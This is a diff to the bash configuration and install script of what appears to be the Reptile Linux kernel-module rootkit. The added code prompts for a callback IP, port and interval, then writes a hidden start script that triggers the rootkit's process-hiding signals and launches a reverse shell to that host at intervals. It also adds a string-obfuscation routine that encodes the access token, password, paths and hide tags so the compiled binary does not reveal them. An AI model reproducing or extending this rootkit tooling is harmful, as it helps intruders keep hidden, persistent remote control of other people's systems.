@@ -38,6 +38,29 @@ function load_config {
 	fi
 }
 
+#
+# This obfuscation idea was suggested by: Ilya V. Matveychikov a.k.a milabs
+# 
+
+function string_obfuscate {
+	n=0
+	VAR=""
+	RETVAL="" 
+
+	for i in $(echo -ne "$1" | hexdump -ve '"%08x\n"'); do
+		VAR+=" p[$n] = 0x$i; \\
+"
+		((n++))	
+	done
+
+	RETVAL+="\\
+({ \\
+unsigned int *p = (unsigned int*)__builtin_alloca( $n * 4 ); \\
+$VAR (char *)p; \\
+})
+"
+}
+
 function directory_remove {
 	read -p "Would you like to remove this directory ($PWD) on exit? (Y/N) [default: N]: "
 	if [ "$REPLY" == "Y" ] || [ "$REPLY" == "y" ]; then
@@ -124,6 +147,20 @@ function reptile_init {
 	load_config "UPD port to port-knocking" "53"
 	UDPPORT=$RETVAL
 
+	load_config "Would you like to config reverse shell each X time? (y/n)" "n"
+	RSH=$RETVAL	
+
+	if [ "$RSH" == "y" ] || [ "$RSH" == "Y" ]; then
+		load_config "Reverse IP"
+		LHOST=$RETVAL
+		
+		load_config "Reverse Port" "80"
+		LPORT=$RETVAL
+
+		load_config "How long is your interval? (in seconds)" "1800"
+		INTERVAL=$RETVAL
+	fi
+
 	MAGIC_ID=$[ ( $RANDOM % ( $[ 99999999 - 1337 ] + 1 ) ) + 1337 ] 
 
 	echo -e "\nHide name: \e[01;36m$MODULE\e[00m"
@@ -132,33 +169,89 @@ function reptile_init {
 	echo -e "SRC port: \e[01;36m$SRCPORT\e[00m"
 	echo -e "TCP port: \e[01;36m$TCPPORT\e[00m"
 	echo -e "UDP port: \e[01;36m$UDPPORT\e[00m"
-	echo -e "TAGs to hide file contents: \n\n\e[01;36m#<$TAG>\n\e[00mcontent to be hidden\n\e[01;36m#</$TAG>\e[00m\n"
+	
+	if [ "$RSH" == "y" ] || [ "$RSH" == "Y" ]; then
+		echo -e "\nReverse shell each X time:"
+		echo -e "Reverse IP: \e[01;36m$LHOST\e[00m"
+		echo -e "Reverse Port: \e[01;36m$LPORT\e[00m"
+		echo -e "Interval: \e[01;36m$INTERVAL\e[00m"
+	fi
+	
+	echo -e "\nTAGs to hide file contents: \n\n\e[01;36m#<$TAG>\n\e[00mcontent to be hidden\n\e[01;36m#</$TAG>\e[00m\n"
 }
 
 function config_gen {
+	string_obfuscate $MODULE
+	MODULESTR=$RETVAL
+
 	_SHELL="/"$MODULE"/"$MODULE"_shell"
+	
+	cat > scripts/start.sh <<EOF
+#!/bin/bash
+
+#<$TAG>
+
+kill -50 0
+EOF
+
+	if [ "$RSH" == "y" ] || [ "$RSH" == "Y" ]; then
+		cat >> scripts/start.sh <<EOF	
+$_SHELL -t $LHOST -p $LPORT -r $INTERVAL
+EOF
+	fi
+
+	cat >> scripts/start.sh <<EOF
+kill -49 \`ps -ef | grep $MODULE | grep -v grep | awk '{print $2}'\`
+
+#</$TAG>
+EOF
+	
+	string_obfuscate $TOKEN
+	TOKEN=$RETVAL
+	
+	string_obfuscate $PASS
+	PASS=$RETVAL
+	
+	string_obfuscate $_SHELL
+	_SHELL=$RETVAL
+	
 	START="/"$MODULE"/"$MODULE"_start.sh"
-	WORKQUEUE="/"$MODULE"_shell"
+	string_obfuscate $START
+	START=$RETVAL
+	
+	TAGIN="#<$TAG>"
+	string_obfuscate $TAGIN
+	TAGIN=$RETVAL
+
+	TAGOUT="#</$TAG>"
+	string_obfuscate $TAGOUT
+	TAGOUT=$RETVAL
+
+	HOMEDIR="/"$MODULE
+	string_obfuscate $HOMEDIR
+	HOMEDIR=$RETVAL
+	
 	RCFILE="/"$MODULE"/"$MODULE"_rc"
+	string_obfuscate $RCFILE
+	RCFILE=$RETVAL
 
 	cat > sbin/config.h <<EOF
 #ifndef _CONFIG_H
 #define _CONFIG_H
 
 #define MAGIC_ID	$MAGIC_ID
-#define TOKEN 		"$TOKEN"
-#define PASS 		"$PASS"
-#define SHELL 		"$_SHELL"
-#define START 		"$START"
-#define HIDE 		"$MODULE"
-#define HIDETAGIN 	"#<$TAG>"
-#define HIDETAGOUT 	"#</$TAG>"
-#define WORKQUEUE 	"$WORKQUEUE"
+#define TOKEN 		$TOKEN
+#define PASS 		$PASS
+#define SHELL 		$_SHELL
+#define START 		$START
+#define HIDE 		$MODULESTR
+#define HIDETAGIN 	$TAGIN
+#define HIDETAGOUT 	$TAGOUT
 #define SRCPORT 	$SRCPORT
 #define TCPPORT 	$TCPPORT
 #define UDPPORT 	$UDPPORT
-#define HOMEDIR 	"/$MODULE"
-#define RCFILE 		"$RCFILE"
+#define HOMEDIR 	$HOMEDIR
+#define RCFILE 		$RCFILE
 #define ERROR		-1
 #define GET_FILE	 1
 #define PUT_FILE	 2
@@ -185,7 +278,7 @@ function reptile_install {
 	mv bin/rep_mod bin/$MODULE.ko > /dev/null 2>&1 && \
 	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 
-	echo -n "Copying binaries to /$MODULE... "
+	echo -n "Copying files to /$MODULE... "
 	mkdir -p /$MODULE && \
 	cp bin/$MODULE* /$MODULE && \
 	cp bin/shell /$MODULE/$MODULE"_shell" && \
